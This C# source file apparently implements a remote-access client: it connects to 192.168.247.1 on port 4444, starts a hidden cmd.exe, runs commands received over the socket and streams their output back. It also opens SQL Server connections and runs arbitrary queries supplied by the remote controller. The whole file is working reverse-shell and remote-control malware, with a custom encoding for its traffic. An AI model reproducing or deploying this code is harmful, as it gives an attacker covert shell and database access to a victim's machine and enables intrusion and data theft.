using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace MSATClient
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Socket...");
            IPEndPoint serverIP = new IPEndPoint(IPAddress.Parse("192.168.247.1"), 4444);
            GetMessage getMessage = null;
            while (true)
            {
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.UseShellExecute = false;    //是否使用操作系统shell启动
                p.StartInfo.RedirectStandardInput = true;//接受来自调用程序的输入信息
                p.StartInfo.RedirectStandardOutput = true;//由调用程序获取输出信息
                p.StartInfo.RedirectStandardError = true;//重定向标准错误输出
                p.StartInfo.CreateNoWindow = true;//不显示程序窗口
                p.Start();//启动程序
                try
                {
                    Socket tcpClient = null;
                    tcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    tcpClient.Connect(serverIP);
                    Console.WriteLine("连接成功！");

                    getMessage = null;
                    getMessage = new GetMessage();
                    getMessage.TcpClient(tcpClient,p);

                }
                catch(Exception ex)
                {
                    Console.WriteLine("Socket连接失败或异常中断！EX："+ex.Message);
                    
                }
                p.WaitForExit();//等待程序执行完退出进程
                p.Close();
            }
        }
    }

    class GetMessage
    {
        static Boolean sqlStatus = false;
        //Boolean systeminfoFlag = true;
        #region Tcp连接方式
        /// <summary>
        /// Tcp连接方式
        /// </summary>
        /// <param name="serverIP"></param>
        public void TcpClient(Socket tcpClient, System.Diagnostics.Process p)
        //public void TcpClient(IPEndPoint serverIP)
        {
            //Socket tcpClient = null;
            SqlConnection conn = new SqlConnection("Server=.;Database=master;uid=sa;pwd=");
            try
            {
                //tcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //tcpClient.Connect(serverIP);
                //Console.WriteLine("连接成功！");

                /**try
                {
                    String mess = "aaaa十多个覅盛大官方机构的法国第三方公司度过覅第三方丢分贵司订购figs地方归属感的覅u公司都发深度覆盖i 速干的复旦十八犯得上发射点风格与是对覅u说的话覅u和粉红色的后覅红色的和反思的活佛收到发受到核辐射的发挥示范的随访是对华盛顿覅u还是丹佛市的回复山东双方都是分红i收到回复史丹佛和山东i覅偶是地方发售的粉红色的佛好的hi富豪的发挥十多个覅盛大官方机构的法国第三方公司度过覅第三方丢分贵司订购figs地方归属感的覅u公司都发深度覆盖i 速干的复旦十八犯得上发射点风格与是对覅u说的话覅u和粉红色的后覅红色的和反思的活佛收到发受到核辐射的发挥示范的随访是对华盛顿覅u还是丹佛市的回复山东双方都是分红i收到回复史丹佛和山东i覅偶是地方发售的粉红色的佛好的hi富豪的发挥十多个覅盛大官方机构的法国第三方公司度过覅第三方丢分贵司订购figs地方归属感的覅u公司都发深度覆盖i 速干的复旦十八犯得上发射点风格与是对覅u说的话覅u和粉红色的后覅红色的和反思的活佛收到发受到核辐射的发挥示范的随访是对华盛顿覅u还是丹佛市的回复山东双方都是分红i收到回复史丹佛和山东i覅偶是地方发售的粉红色的佛好的hi富豪的发挥十多个覅盛大官方机构的法国第三方公司度过覅第三方丢分贵司订购figs地方归属感的覅u公司都发深度覆盖i 速干的复旦十八犯得上发射点风格与是对覅u说的话覅u和粉红色的后覅红色的和反思的活佛收到发受到核辐射的发挥示范的随访是对华盛顿覅u还是丹佛市的回复山东双方都是分红i收到回复史丹佛和山东i覅偶是地方发售的粉红色的佛好的hi富豪的发挥十多个覅盛大官方机构的法国第三方公司度过覅第三方丢分贵司订购figs地方归属感的覅u公司都发深度覆盖i 速干的复旦十八犯得上发射点风格与是对覅u说的话覅u和粉红色的后覅红色的和反思的活佛收到发受到核辐射的发挥示范的随访是对华盛顿覅u还是丹佛市的回复山东双方都是分红i收到回复史丹佛和山东i覅偶是地方发售的粉红色的佛好的hi富豪的发挥十多个覅盛大官方机构的法国第三方公司度过覅第三方丢分贵司订购figs地方归属感的覅u公司都发深度覆盖i 速干的复旦十八犯得上发射点风格与是对覅u说的话覅u和粉红色的后覅红色的和反思的活佛收到发受到核辐射的发挥示范的随访是对华盛顿覅u还是丹佛市的回复山东双方都是分红i收到回复史丹佛和山东i覅偶是地方发售的粉红色的佛好的hi富豪的发挥十多个覅盛大官方机构的法国第三方公司度过覅第三方丢分贵司订购figs地方归属感的覅u公司都发深度覆盖i 速干的复旦十八犯得上发射点风格与是对覅u说的话覅u和粉红色的后覅红色的和反思的活佛收到发受到核辐射的发挥示范的随访是对华盛顿覅u还是丹佛市的回复山东双方都是分红i收到回复史丹佛和山东i覅偶是地方发售的粉红色的佛好的hi富豪的发挥十多个覅盛大官方机构的法国第三方公司度过覅第三方丢分贵司订购figs地方归属感的覅u公司都发深度覆盖i 速干的复旦十八犯得上发射点风格与是对覅u说的话覅u和粉红色的后覅红色的和反思的活佛收到发受到核辐射的发挥示范的随访是对华盛顿覅u还是丹佛市的回复山东双方都是分红i收到回复史丹佛和山东i覅偶是地方发售的粉红色的佛好的hi富豪的发挥十多个覅盛大官方机构的法国第三方公司度过覅第三方丢分贵司订购figs地方归属感的覅u公司都发深度覆盖i 速干的复旦十八犯得上发射点风格与是对覅u说的话覅u和粉红色的后覅红色的和反思的活佛收到发受到核辐射的发挥示范的随访是对华盛顿覅u还是丹佛市的回复山东双方都是分红i收到回复史丹佛和山东i覅偶是地方发售的粉红色的佛好的hi富豪的发挥bbbbb";
                    //mess = "001" + StringToUnicode(mess);
                    String a = StringToUnicode(mess);
                    mess = "3" + Scale.ToCurr((a.Length + 3) / (99)).Substring(1,2) + a;
                    byte[] sendmess = Encoding.UTF8.GetBytes(mess);
                    Console.WriteLine(Encoding.UTF8.GetString(sendmess));
                    tcpClient.Send(sendmess);
                }
                catch 
                {
                    Console.WriteLine("TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                    System.Environment.Exit(0);
                }**/
            }
            catch
            {
                Console.WriteLine("连接失败！请检查网络！");
                //System.Environment.Exit(0);
            }
            /**System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;    //是否使用操作系统shell启动
            p.StartInfo.RedirectStandardInput = true;//接受来自调用程序的输入信息
            p.StartInfo.RedirectStandardOutput = true;//由调用程序获取输出信息
            p.StartInfo.RedirectStandardError = true;//重定向标准错误输出
            p.StartInfo.CreateNoWindow = true;//不显示程序窗口
            p.Start();//启动程序**/
            //接收数据
            new Thread(() =>
            {
                while (true)
                {
                    String getmess = "";
                    byte[] data = new byte[1024 * 1024 * 3];
                    try
                    {
                        int length = tcpClient.Receive(data);
                        byte thisLenFlag = 1;
                        //getmess = Encoding.UTF8.GetString(data,3,length-3);
                        getmess = Encoding.UTF8.GetString(data, 0, length);  //调试
                        String allFlag = getmess.Substring(0, 3);
                        char firstFlag = allFlag[0];
                        int lenFlag = Scale.ToInt32(allFlag.Substring(1, 2));
                        //Console.WriteLine(getmess);
                        String mess = UnicodeToString(getmess.Replace(allFlag, ""));
                        //Console.WriteLine(getmess+"99999");
                        //getmess = getmess.Substring(0,50);
                        //getmess = RSADecrypt(getmess);
                        while (lenFlag >= thisLenFlag)
                        {
                            length = tcpClient.Receive(data);
                            getmess = Encoding.UTF8.GetString(data, 0, length);
                            mess += UnicodeToString(getmess);
                            thisLenFlag++;
                        }
                        Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(字符长度为：" + mess.Length + "；标志位：" + firstFlag + "): " + mess);
                            if (firstFlag == '0')
                            {
                                conn = SqlInfo(tcpClient, conn, mess);
                            }
                            else if (firstFlag == '2') {
                                try
                                {
                                    SqlCommand command = new SqlCommand(mess, conn);
                                    SqlDataAdapter reader = new SqlDataAdapter(mess, conn);
                                    DataSet dataSet = new DataSet();
                                    reader.Fill(dataSet,"SQL");
                                    mess = dataSet.GetXml();
                                    SendMess(tcpClient, mess, "2");
                                }
                                catch (Exception ex)
                                {
                                    SendMess(tcpClient,mess + "\r\n" + ex.Message, "9");
                                }
                                /**Byte[] sqlResult = GetStringFormatDataSet(dataSet);
                                SendMess(tcpClient,Convert.ToString(sqlResult.Length),"2");
                                try
                                {
                                    tcpClient.Send(sqlResult);
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine("TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                                    System.Environment.Exit(0);
                                }**/
                            }
                            else if (firstFlag == '3')
                            {
                                if (!sqlStatus)
                                {
                                    SendMess(tcpClient, "数据库未连接，请连接后再试！", "3");
                                }
                                else
                                {
                                    SqlCommand MyCommand = new SqlCommand("mess", conn);
                                    SqlDataAdapter SelectAdapter = new SqlDataAdapter();//定义一个数据适配器
                                    SelectAdapter.SelectCommand = MyCommand;//定义数据适配器的操作指令
                                    DataSet MyDataSet = new DataSet();//定义一个数据集
                                    SelectAdapter.SelectCommand.ExecuteNonQuery();//执行数据库查询指令
                                    SelectAdapter.Fill(MyDataSet);//填充数据集
                                    Console.WriteLine(MyDataSet.ToString());
                                }
                                //conn.
                            }
                            else if (firstFlag == '4')
                            {
                                //cmd(tcpClient, mess);
                                p.StandardInput.WriteLine(mess);
                                if (mess.Contains("cd "))
                                    p.StandardInput.WriteLine(" ");
                                p.StandardInput.AutoFlush = true;

                                //StreamReader reader = p.StandardOutput;//截取输出流
                                //StreamReader error = p.StandardError;//截取错误信息
                                //mess = reader.ReadToEnd(); //+ error.ReadToEnd();
                                //mess = p.StandardOutput.ReadToEnd();
                                //Console.WriteLine(mess);
                                //SendMess(tcpClient, mess,"4");
                            }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("接收消息：TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                        //p.WaitForExit();//等待程序执行完退出进程
                        //p.Close();
                        break;
                        //System.Environment.Exit(0);
                    }
                }
        }).Start();

            //发送数据
            /**new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        String mess;
                        mess = Console.ReadLine();
                        mess = StringToUnicode(mess);
                        mess = "3" + Scale.ToCurr((mess.Length + 3) / (1024 * 1024 * 3)).Substring(1, 2) + mess;
                        byte[] sendmess = Encoding.UTF8.GetBytes(mess);
                        //Console.WriteLine(Encoding.UTF8.GetString(sendmess));
                        tcpClient.Send(sendmess);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                        System.Environment.Exit(0);
                    }
                }
            }).Start();**/

            //cmd命令正常
            new Thread(() =>
            {
                String result = "";
                while (true)
                {
                    try
                    {
                        result = p.StandardOutput.ReadLine();
                        if (result != "" && result != "\n")
                            SendMess(tcpClient, result + '\n', "4");
                    }
                    catch (Exception ex)
                    {
                        break;
                    }
                }
            }).Start();

            //cmd命令报错
            new Thread(() =>
            {
                String result = "";
                while (true)
                {
                    try
                    {
                        result = p.StandardError.ReadLine();
                        int len = result.Length;
                        if (len > 0)
                        {
                            if (result[0] == '\n' && len >= 2)
                            {
                                result = result.Substring(1, len - 2);
                            }
                        }
                        if (result != "" && result != "\n")
                            SendMess(tcpClient, result, "4");
                    }
                    catch (Exception ex)
                    {
                        break;
                    }
                }
            }).Start();
        }
        #endregion
        
        public static Byte[] GetStringFormatDataSet(DataSet ds)
        {
            //创建内存流
            MemoryStream memStream = new MemoryStream();
            //产生二进制序列化格式
            IFormatter formatter = new BinaryFormatter();
            //指定DataSet串行化格式是二进制
            ds.RemotingFormat = SerializationFormat.Binary;
            //串行化到内存中
            formatter.Serialize(memStream, ds);
            //将DataSet转化成byte[]
            //String mess = memStream.ToString();
            byte[] binaryResult = memStream.ToArray();
            //清空和释放内存流
            memStream.Close();
            memStream.Dispose();
            return binaryResult;
        }

        public static void SendMess(Socket tcpClient, String mess , String flag) {
            try
            {
                Console.WriteLine(mess);
                mess = StringToUnicode(mess);
                mess = flag + Scale.ToCurr((mess.Length + 3) / (1024 * 1024 * 3)).Substring(1, 2) + mess;
                //Console.WriteLine(mess);
                byte[] sendmess = Encoding.UTF8.GetBytes(mess);
                //Console.WriteLine(Encoding.UTF8.GetString(sendmess));
                tcpClient.Send(sendmess);
            }
            catch (Exception ex)
            {
                Console.WriteLine("发送消息：TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                //System.Environment.Exit(0);
            }
        }

        //标识符为0
        public static SqlConnection SqlInfo(Socket tcpClient,SqlConnection conn, String mess)
        {
            //conn = new SqlConnection("Server=.;Database=master;uid=sa;pwd=");
            if (conn.State == ConnectionState.Open)
            {
                conn.Close();
            }
            try
            {
                //Server:这边是填写数据库地址的地方。可以是IP，或者.\local\localhost\电脑名+实例名
                //Database:数据库的名称
                //uid:数据库用户名，一般为sa
                //pwd：数据库密码
                //conn = new SqlConnection("Server=.;Database=master;uid=sa;pwd=" + mess);
                conn = new SqlConnection(mess);
                /**String[] info = mess.Split(',');
                if (info[0] == "")
                    info[0] = ".";
                if (info[1] == "")
                    info[1] = "master";
                if (info[2] == "")
                    info[2] = "sa";
                conn = new SqlConnection("Server="+info[0]+";Database="+info[1]+";uid="+info[2]+";pwd=" + info[3]);
                Console.WriteLine("Server=" + info[0] + ";Database=" + info[1] + ";uid=" + info[2] + ";pwd=" + info[3]);**/
                conn = new SqlConnection(mess);
                conn.Open();
                if (conn.State == ConnectionState.Open)
                {
                    //Console.WriteLine("数据库已经打开");
                    sqlStatus = true;
                    SendMess(tcpClient,"数据库连接成功！","9");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("数据库连接失败! EX:" + ex.Message);
                SendMess(tcpClient, ex.Message, "9");
            }
            return conn;
        }

        //标识符为4
        public static void cmd(Socket tcpClient, String mess) {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;    //是否使用操作系统shell启动
            p.StartInfo.RedirectStandardInput = true;//接受来自调用程序的输入信息
            p.StartInfo.RedirectStandardOutput = true;//由调用程序获取输出信息
            p.StartInfo.RedirectStandardError = true;//重定向标准错误输出
            p.StartInfo.CreateNoWindow = true;//不显示程序窗口
            p.Start();//启动程序
            p.StandardInput.WriteLine(mess + "&exit");
            p.StandardInput.AutoFlush = true;
            mess = p.StandardOutput.ReadToEnd();
            //Console.WriteLine(mess);
            p.WaitForExit();//等待程序执行完退出进程
            p.Close();
            SendMess(tcpClient, mess,"4");
        }

        public static string UnicodeToString(string srcText)
        {
            string dst = "";
            string src = srcText;
            int len = srcText.Length / 3;
            for (int i = 0; i <= len - 1; i++)
            {
                string str = "";
                str = src.Substring(0, 3);
                src = src.Substring(3);
                int uninum = Scale.ToInt32(str);
                String str1 = Convert.ToString(uninum % (16 * 16), 16);
                String str0 = Convert.ToString((uninum - (uninum % (16 * 16))) / (16 * 16), 16);
                byte[] bytes = new byte[2];
                bytes[1] = byte.Parse(int.Parse(str0, NumberStyles.HexNumber).ToString());
                bytes[0] = byte.Parse(int.Parse(str1, NumberStyles.HexNumber).ToString());
                dst += Encoding.Unicode.GetString(bytes);
            }
            return dst;
        }

        public static string StringToUnicode(string s)
        {
            char[] charbuffers = s.ToCharArray();
            byte[] buffer;
            String uniString = "";
            //StringBuilder sb = new StringBuilder();
            for (int i = 0; i < charbuffers.Length; i++)
            {
                buffer = System.Text.Encoding.Unicode.GetBytes(charbuffers[i].ToString());
                int uninum = buffer[1] * 16 * 16 + buffer[0];
                String uni = Scale.ToCurr(uninum);
                uniString += uni;
                //String uni = String.Format("{0:X2}{1:X2}", buffer[1], buffer[0]);
                //Console.WriteLine(uninum);
                //sb.Append(String.Format("//u{0:X2}{1:X2}", buffer[1], buffer[0]));
            }
            return uniString;
            //return sb.ToString();
        }

    }


    //36进制
    public static class Scale
    {
        /// <summary>
        /// 进制符号字符串
        /// </summary>
        private static string scString = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        /// <summary>
        /// 字符集，可以根据编号索引拿到字符
        /// </summary>
        private static char[] scArray = scString.ToCharArray();
        /// <summary>
        /// 字符字典，可以根据字符拿到编号索引
        /// </summary>
        private static Dictionary<char, int> scDic = ToCharDic();
        /// <summary>
        /// 根据字符串反馈进制数
        /// </summary>
        public static int Len { get { return scString.Length; } }

        /// <summary>
        /// 将字符串处理成字符字典
        /// </summary>
        private static Dictionary<char, int> ToCharDic()
        {
            Dictionary<char, int> dic = new Dictionary<char, int>();
            for (int i = 0; i < scArray.Length; i++)
            {
                dic.Add(scArray[i], i);
            }
            return dic;
        }
        /// <summary>
        /// 根据传入的字符符号定义进制，字符符号不能重复，模拟十进制字符串为：0123456789
        /// </summary>
        public static void SetScale(string scaleString)
        {
            scString = scaleString;
            scArray = scString.ToCharArray();
            scDic = ToCharDic();
        }
        /// <summary>
        /// 将Int64转成当前进制字符串
        /// </summary>
        public static string ToCurr(long num)
        {
            string curr = "";
            while (num >= Len)
            {
                curr = scArray[num % Len] + curr;
                num = num / Len;
            }
            curr = scArray[num] + curr;
            if (curr.Length == 0)
            {
                curr = "000";
            }
            else if (curr.Length == 1)
            {
                curr = "00" + curr;
            }
            else if (curr.Length == 2)
            {
                curr = "0" + curr;
            }
            return curr;
        }
        /// <summary>
        /// 将当前进制字符串转成Int64
        /// </summary>
        public static int ToInt32(string curr)
        {
            double num = 0;
            for (int i = 0; i < curr.Length; i++)
            {
                num += scDic[curr[i]] * Math.Pow(Len, curr.Length - 1 - i);
            }
            return Convert.ToInt32(num);
        }
    }
}
